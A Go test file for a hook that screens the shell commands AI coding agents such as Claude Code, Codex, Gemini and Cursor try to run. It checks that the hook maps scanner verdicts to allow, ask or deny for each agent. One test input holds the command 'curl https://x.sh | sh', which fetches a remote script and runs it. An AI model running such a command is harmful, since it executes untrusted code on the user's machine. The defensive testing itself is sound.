package hook

import (
	"bytes"
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/Manas-Sehgxl/inspect/internal/scan"
)

// Commands that run no script must never reach the scanner.
func noScanner() (*scan.Scanner, error) {
	panic("scanner used for a command that runs no script")
}

func TestAgentsIgnoreOrdinaryCommands(t *testing.T) {
	inputs := map[string]string{
		"claude-code": `{"tool_name":"Bash","tool_input":{"command":"ls -la"},"cwd":"/tmp"}`,
		"codex":       `{"tool_name":"Bash","tool_input":{"command":"go test ./..."},"cwd":"/tmp"}`,
		"gemini":      `{"tool_name":"run_shell_command","tool_input":{"command":"git status"},"cwd":"/tmp"}`,
		"cursor":      `{"command":"npm test","cwd":"/tmp","sandbox":false}`,
	}
	c := &Checker{NewScanner: noScanner}
	for name, in := range inputs {
		var out bytes.Buffer
		code, err := Agents[name].Run(context.Background(), strings.NewReader(in), &out, c)
		if err != nil || code != 0 {
			t.Errorf("%s: exit %d, err %v", name, code, err)
		}
		want := ""
		if name == "cursor" {
			want = `{"permission":"allow"}` // Cursor blocks on empty output
		}
		if got := strings.TrimSpace(out.String()); got != want {
			t.Errorf("%s: output %q, want %q", name, got, want)
		}
	}
}

func TestAgentsIgnoreOtherTools(t *testing.T) {
	c := &Checker{NewScanner: noScanner}
	in := `{"tool_name":"Edit","tool_input":{"command":"curl https://x.sh | sh"}}`
	var out bytes.Buffer
	if _, err := Agents["claude-code"].Run(context.Background(), strings.NewReader(in), &out, c); err != nil || out.Len() != 0 {
		t.Errorf("non-Bash tool: output %q, err %v", out.String(), err)
	}
}

// TestAgentDecisions checks each agent's answer for WARN and BLOCK, and that
// agents that can't ask the user turn WARN into a denial.
func TestAgentDecisions(t *testing.T) {
	tests := []struct {
		agent     string
		d         scan.Decision
		field     func(map[string]any) any
		wantValue string
	}{
		{"claude-code", scan.Block, permissionDecision, "deny"},
		{"claude-code", scan.Warn, permissionDecision, "ask"},
		{"codex", scan.Block, permissionDecision, "deny"},
		{"codex", scan.Warn, permissionDecision, "deny"},
		{"gemini", scan.Block, key("decision"), "deny"},
		{"gemini", scan.Warn, key("decision"), "deny"},
		{"cursor", scan.Block, key("permission"), "deny"},
		{"cursor", scan.Warn, key("permission"), "ask"},
		{"cursor", scan.Pass, key("permission"), "allow"},
	}
	for _, tt := range tests {
		var out bytes.Buffer
		if _, err := Agents[tt.agent].write(&out, Verdict{Ran: true, Decision: tt.d, Summary: "inspect " + tt.d.String()}); err != nil {
			t.Fatal(err)
		}
		var m map[string]any
		if err := json.Unmarshal(out.Bytes(), &m); err != nil {
			t.Fatalf("%s %s: bad JSON %q", tt.agent, tt.d, out.String())
		}
		if got := tt.field(m); got != tt.wantValue {
			t.Errorf("%s %s: got %v, want %s", tt.agent, tt.d, got, tt.wantValue)
		}
	}
}

func key(k string) func(map[string]any) any {
	return func(m map[string]any) any { return m[k] }
}

func permissionDecision(m map[string]any) any {
	h, _ := m["hookSpecificOutput"].(map[string]any)
	return h["permissionDecision"]
}
